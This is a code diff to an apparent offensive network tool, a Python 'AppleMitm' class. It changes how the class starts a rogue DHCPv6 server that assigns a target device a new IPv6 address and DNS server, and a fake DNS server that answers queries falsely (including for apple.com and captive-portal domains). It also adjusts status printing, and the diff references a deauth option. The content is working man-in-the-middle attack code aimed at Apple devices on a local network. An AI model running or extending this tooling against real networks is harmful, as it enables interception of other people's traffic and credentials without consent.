@@ -183,19 +183,19 @@ class AppleMitm:
     def _dhcpv6_server(self):
         sleep(3)
         dhcpv6_server: DHCPv6Server = DHCPv6Server(network_interface=self._your['network-interface'])
-        dhcpv6_server.start(target_mac_address=self._target['mac-address'],
-                            target_ipv6_address=self._target['new-ipv6-address'],
+        dhcpv6_server.start(target_ipv6_address=self._target['new-ipv6-address'],
+                            target_mac_address=self._target['mac-address'],
+                            dns_server_ipv6_address=self._dns_server['ipv6-address'],
                             ipv6_prefix=self._ipv6_network_prefix,
-                            exit_on_success=True, quit=True)
+                            exit_on_success=True, quit=False)
     # endregion
 
     # region DNS server
     def _start_dns_server(self):
         dns_server: DnsServer = DnsServer(network_interface=self._your['network-interface'])
-        dns_server.start(fake_ipv4_addresses=[self._your['ipv4-address']],
-                         fake_ipv6_addresses=[self._your['ipv6-link-address']],
-                         fake_domains_regexp=['.*apple.com', 'authentication.net'],
-                         success_domains=['captive.apple.com', 'authentication.net'])
+        dns_server.start(fake_answers=True,
+                         success_domains=['captive.apple.com', 'authentication.net'],
+                         listen_ipv6=True)
     # endregion
 
     # region Requests sniffer PRN function
@@ -551,14 +551,15 @@ class AppleMitm:
             self._base.print_info('Your IPv6 local address: ', self._your['ipv6-link-address'])
             self._base.print_info('Prefix: ', self._ipv6_network_prefix)
             self._base.print_info('Gateway IPv6 address: ', self._gateway['ipv6-address'])
-            self._base.print_info('DNS server IPv6 address: ', self._dns_server['ipv6_address'])
+            self._base.print_info('DNS server IPv6 address: ', self._dns_server['ipv6-address'])
 
             if self._target['mac-address'] is not None:
                 self._base.print_info('Target MAC address: ', self._target['mac-address'])
 
-            self._base.print_info('Target IPv6 address: ', self._target['ipv6-address'])
+            if self._target['ipv6-address'] is not None:
+                self._base.print_info('Target IPv6 address: ', self._target['ipv6-address'])
 
-            if self._mitm_technique == 4:
+            if self._target['new-ipv6-address'] is not None:
                 self._base.print_info('Target new global IPv6 address: ', self._target['new-ipv6-address'])
 
         if deauth:
